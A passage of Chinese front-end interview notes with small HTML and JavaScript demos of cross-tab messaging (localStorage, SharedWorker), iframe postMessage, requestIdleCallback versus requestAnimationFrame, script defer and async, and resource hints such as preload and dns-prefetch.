    - <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">SharedWorker</font><font style="color:rgb(44, 62, 80);">兼容性不太好，调试不方便，</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">IE11</font><font style="color:rgb(44, 62, 80);">不支持</font>

**<font style="color:rgb(44, 62, 80);">localStorage通讯例子</font>**

```html
<!-- 列表页 -->
<p>localStorage message - list page</p>

<script>
  // 监听storage事件
  window.addEventListener('storage', event => {
    console.info('key', event.key)
    console.info('value', event.newValue)
  })
</script>
```

```html
<!-- 详情页 -->
<p>localStorage message - detail page</p>

<button id="btn1">修改标题</button>

<script>
  const btn1 = document.getElementById('btn1')
  btn1.addEventListener('click', () => {
    const newInfo = {
      id: 100,
      name: '标题' + Date.now()
    }
    localStorage.setItem('changeInfo', JSON.stringify(newInfo))
  })

  // localStorage 跨域不共享
</script>
```

**<font style="color:rgb(44, 62, 80);">SharedWorker通讯例子</font>**

<font style="color:rgb(44, 62, 80);">本地调试的时候打开chrome隐私模式验证，如果没有收到消息，打开</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">chrome://inspect/workers</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">=></font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">sharedWorkers</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">=> 点击</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">inspect</font>

![](https://cdn.nlark.com/yuque/0/2024/png/207857/1718783563901-5518bbc5-fa1b-42b2-94b0-c6f3695c61dc.png)

```html
<p>SharedWorker message - list page</p>

<script>
  const worker = new SharedWorker('./worker.js')
  worker.port.onmessage = e => console.info('list', e.data)
</script>
```

```html
<p>SharedWorker message - detail page</p>
<button id="btn1">修改标题</button>

<script>
  const worker = new SharedWorker('./worker.js')

  const btn1 = document.getElementById('btn1')
  btn1.addEventListener('click', () => {
    console.log('clicked')
    worker.port.postMessage('detail go...')
  })
</script>
```

```javascript
// worker.js

/**
 * @description for SharedWorker
 */

const set = new Set()

onconnect = event => {
  const port = event.ports[0]
  set.add(port)

  // 接收信息
  port.onmessage = e => {
    // 广播消息
    set.forEach(p => {
      if (p === port) return // 不给自己广播
      p.postMessage(e.data)
    })
  }

  // 发送信息
  port.postMessage('worker.js done')
}
```

**<font style="color:rgb(44, 62, 80);">连环问：如何实现网页和iframe之间的通讯</font>**

+ <font style="color:rgb(44, 62, 80);">使用</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">postMessage</font><font style="color:rgb(44, 62, 80);">通信</font>
+ <font style="color:rgb(44, 62, 80);">注意跨域的限制和判断，判断域名的合法性</font>

<font style="color:rgb(44, 62, 80);">演示</font>

```html
<!-- 首页 -->
<p>
  index page
  <button id="btn1">发送消息</button>
</p>

<iframe id="iframe1" src="./child.html"></iframe>

<script>
  document.getElementById('btn1').addEventListener('click', () => {
    console.info('index clicked')
    window.iframe1.contentWindow.postMessage('hello', '*') // * 没有域名限制
  })

  // 接收child的消息
  window.addEventListener('message', event => {
    console.info('origin', event.origin) // 来源的域名
    console.info('index received', event.data)
  })
</script>
```

```html
<!-- 子页面 -->
<p>
  child page
  <button id="btn1">发送消息</button>
</p>

<script>
  document.getElementById('btn1').addEventListener('click', () => {
    console.info('child clicked')
    // child被嵌入到index页面，获取child的父页面
    window.parent.postMessage('world', '*') // * 没有域名限制
  })

  // 接收parent的消息
  window.addEventListener('message', event => {
    console.info('origin', event.origin) // 判断 origin 的合法性
    console.info('child received', event.data)
  })
</script>
```

<font style="color:rgb(44, 62, 80);">效果</font>

![](https://cdn.nlark.com/yuque/0/2024/png/207857/1718783563804-eb396a5c-5ccf-4dd5-be73-ef6c9cd6b9a2.png)

### [](https://www.123fe.net/docs/base/high-frequency.html#requestidlecallback%E5%92%8Crequestanimationframe%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB)<font style="color:rgb(44, 62, 80);">requestIdleCallback和requestAnimationFrame有什么区别</font>
<font style="color:rgb(44, 62, 80);">由</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">react fiber</font><font style="color:rgb(44, 62, 80);">引起的关注</font>

+ <font style="color:rgb(44, 62, 80);">组件树转为链表，可分段渲染</font>
+ <font style="color:rgb(44, 62, 80);">渲染时可以暂停，去执行其他高优先级任务，空闲时在继续渲染（</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JS</font><font style="color:rgb(44, 62, 80);">是单线程的，</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JS</font><font style="color:rgb(44, 62, 80);">执行的时候没法去</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">DOM</font><font style="color:rgb(44, 62, 80);">渲染）</font>
+ <font style="color:rgb(44, 62, 80);">如何判断空闲？</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">requestIdleCallback</font>

**<font style="color:rgb(44, 62, 80);">区别</font>**

+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">requestAnimationFrame</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">每次渲染完在执行，高优先级</font>
+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">requestIdleCallback</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">空闲时才执行，低优先级</font>
+ <font style="color:rgb(44, 62, 80);">都是宏任务，要等待DOM渲染完后在执行</font>

![](https://cdn.nlark.com/yuque/0/2024/png/207857/1718783566074-bbe7807c-5b06-4eaf-9d0d-7fb00ff11f5b.png)<font style="color:rgb(44, 62, 80);"> </font>![](https://cdn.nlark.com/yuque/0/2024/png/207857/1718783567027-9b743618-e80c-4939-81b7-4b9f0a86fc92.png)

```html
<p>requestAnimationFrame</p>

<button id="btn1">change</button>
<div id="box"></div>

<script>
  const box = document.getElementById('box')
  
  document.getElementById('btn1').addEventListener('click', () => {
  let curWidth = 100
  const maxWidth = 400

  function addWidth() {
    curWidth = curWidth + 3
    box.style.width = `${curWidth}px`
    if (curWidth < maxWidth) {
        window.requestAnimationFrame(addWidth) // 时间不用自己控制
    }
  }
  addWidth()
})
</script>
```

```javascript
window.onload = () => {
  console.info('start')
  setTimeout(() => {
    console.info('timeout')
  })
  // 空闲时间才执行
  window.requestIdleCallback(() => {
    console.info('requestIdleCallback')
  })
  window.requestAnimationFrame(() => {
    console.info('requestAnimationFrame')
  })
  console.info('end')
}

// start
// end
// timeout
// requestAnimationFrame
// requestIdleCallback
```

### [](https://www.123fe.net/docs/base/high-frequency.html#script%E6%A0%87%E7%AD%BE%E7%9A%84defer%E5%92%8Casync%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB)<font style="color:rgb(44, 62, 80);">script标签的defer和async有什么区别</font>
+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">script</font><font style="color:rgb(44, 62, 80);">：</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTML</font><font style="color:rgb(44, 62, 80);">暂停解析，下载</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JS</font><font style="color:rgb(44, 62, 80);">，执行</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JS</font><font style="color:rgb(44, 62, 80);">，在继续解析</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTML</font><font style="color:rgb(44, 62, 80);">。</font>
+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">defer</font><font style="color:rgb(44, 62, 80);">：</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTML</font><font style="color:rgb(44, 62, 80);">继续解析，并行下载</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JS</font><font style="color:rgb(44, 62, 80);">，</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTML</font><font style="color:rgb(44, 62, 80);">解析完在执行</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JS</font><font style="color:rgb(44, 62, 80);">（不用把</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">script</font><font style="color:rgb(44, 62, 80);">放到</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">body</font><font style="color:rgb(44, 62, 80);">后面，我们在</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">head</font><font style="color:rgb(44, 62, 80);">中</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);"><script defer></font><font style="color:rgb(44, 62, 80);">让</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">js</font><font style="color:rgb(44, 62, 80);">脚本并行加载会好点）</font>
+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">async</font><font style="color:rgb(44, 62, 80);">：</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTML</font><font style="color:rgb(44, 62, 80);">继续解析，并行下载</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JS</font><font style="color:rgb(44, 62, 80);">，执行</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JS</font><font style="color:rgb(44, 62, 80);">（</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">加载完毕后立即执行</font><font style="color:rgb(44, 62, 80);">），在继续解析</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTML</font>
    - <font style="color:rgb(44, 62, 80);">加载完毕后立即执行，这导致</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">async</font><font style="color:rgb(44, 62, 80);">属性下的脚本是乱序的，对于</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">script</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">有先后依赖关系的情况，并不适用</font>

<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">注意：</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JS</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">是单线程的，</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JS</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">解析线程和</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">DOM</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">解析线程共用同一个线程，</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JS执行和HTML解析是互斥的</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">，加载资源可以并行</font>

![](https://cdn.nlark.com/yuque/0/2024/png/207857/1718783567067-a8731033-4a5b-4478-9399-1eeb81c94105.png)

<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">蓝色线代表网络读取，红色线代表执行时间，这俩都是针对脚本的；绿色线代表</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HTML</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">解析</font>

**<font style="color:rgb(44, 62, 80);">连环问：prefetch和dns-prefetch分别是什么</font>**

**<font style="color:rgb(44, 62, 80);">preload和prefetch</font>**

+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">preload</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">资源在当前页面使用，会优先加载</font>
+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">prefetch</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">资源在未来页面使用，空闲时加载</font>

```html
<head>
  <!-- 当前页面使用 -->
  <link rel="preload" href="style.css" as="style" />
  <link rel="preload" href="main.js" as="script" />

  <!-- 未来页面使用 提前加载 比如新闻详情页 -->
  <link rel="prefetch" href="other.js" as="script" />

  <!-- 当前页面 引用css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <!-- 当前页面 引用js -->
  <script src="main.js" defer></script>
</body>
```

**<font style="color:rgb(44, 62, 80);">dns-preftch和preconnect</font>**

+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">dns-pretch</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">DNS</font><font style="color:rgb(44, 62, 80);">预查询</font>
+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">preconnect</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">DNS</font><font style="color:rgb(44, 62, 80);">预连接</font>

<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">通过预查询和预连接减少</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">DNS</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">解析时间</font>

```html
<head>
  <!-- 针对未来页面提前解析：提高打开速度 -->
  <link rel="dns-pretch" href="https://font.static.com" />
  <link rel="preconnect" href="https://font.static.com" crossorigin />
</head>
```

